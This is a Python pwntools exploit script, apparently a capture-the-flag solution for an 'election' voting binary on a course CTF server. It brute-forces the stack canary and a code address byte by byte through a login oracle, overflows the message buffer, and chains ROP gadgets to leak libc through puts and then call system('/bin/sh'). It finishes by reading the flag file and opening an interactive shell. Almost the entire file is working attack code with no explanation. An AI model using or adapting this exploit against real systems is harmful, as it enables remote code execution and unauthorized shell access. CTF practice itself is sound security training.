#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
library = ELF('./libc-2.27.so')
binary = remote('edu-ctf.csie.org', 10180)
# binary = process('./election')
# pause()


def login(token):
    binary.sendafter('>', '1')
    binary.sendafter("Token:", token)


def register(token):
    binary.sendafter('>', '2')
    binary.sendafter("Register an anonymous token: ", token)


def vote(idx):
    binary.sendafter('>', '1')
    binary.sendafter("Your choice [0~9]: ", idx)


def message(idx, msg):
    binary.sendafter('>', '2')
    binary.sendafter("To [0~9]: ", idx)
    binary.sendafter("Message: ", msg)


def logout():
    binary.sendafter('>', '3')


def vote10(idx):
    token = "token"
    register(token)
    login(token)
    for i in range(10):
        vote(idx)
    logout()


def testByte(canary, token):
    for i in range(1, 256):
        byte = i.to_bytes(1, byteorder='little')
        login(token+canary+byte)
        response = binary.recvuntil("EDU 2019 Election Voting System v1.0")
        if(b"Invalid token." not in response):
            return byte


token = b"A" * 0xb8
register(token)

# brute force canary
info("Brute forcing canary")
canary = b'\0'
for i in range(7):
    canary += testByte(canary, token)
    logout()
success("canary            -> %s" % hex(u64(canary)))

# brute force address of __libc_csu_init()
info("Brute forcing __libc_csu_init()")
csu = b''
for i in range(6):
    byte = testByte(canary+csu, token)
    if(byte):
        csu += byte
    else:
        csu += b'\0'
    logout()
csu += b'\0\0'
success("__libc_csu_init() -> %s" % hex(u64(csu)))


# To overflow msg (0xe0 = 224), need 224 (message)
#                                    + 8
#                                    + 8 (canary)
#                                    + 8 (saved rbp)
#                                    + 8 (return address)
info("Voting")
for i in range(25):
    vote10('4')

# First ROP chain
puts_plt = u64(csu) - 0x1140 + 0x940
puts_got = u64(csu) - 0x1140 + 0x201f90
ret = u64(csu) + 100
main = u64(csu) - 0x1140 + 0xffb + 1
pop_rdi = u64(csu) + 99

token = flat(
    pop_rdi,
    puts_got,
    puts_plt,
    main,
)
register(token)
login(token)
for i in range(5):
    vote('4')
# vote = 255
# overflow the return address to csu
popr14_15 = u64(csu) + 96
message('4', b'A'*0xe0 + b'B'*8 + canary + b'C'*8 +
        popr14_15.to_bytes(7, byteorder="little"))

# trigger ROP chain to leak libc address
logout()
puts_libc = binary.recvuntil(b'\x7f').strip()
library.address = u64(puts_libc+b'\0\0') - 0x809c0
success("libc        -> %s" % hex(library.address))

# Second ROP chain
bin_sh = next(library.search(b'/bin/sh'))
system_offset = 0x4f440

token = flat(
    pop_rdi,
    bin_sh,
    library.address + system_offset,
)

info("Voting")
for i in range(25):
    vote10('4')
register(token)
login(token)
for i in range(5):
    vote('4')
message('4', b'B'*0xe0 + b'C'*8 + canary + b'D'*8 +
        popr14_15.to_bytes(7, byteorder="little"))

logout()
binary.sendline("cat /home/election/flag")

binary.interactive()
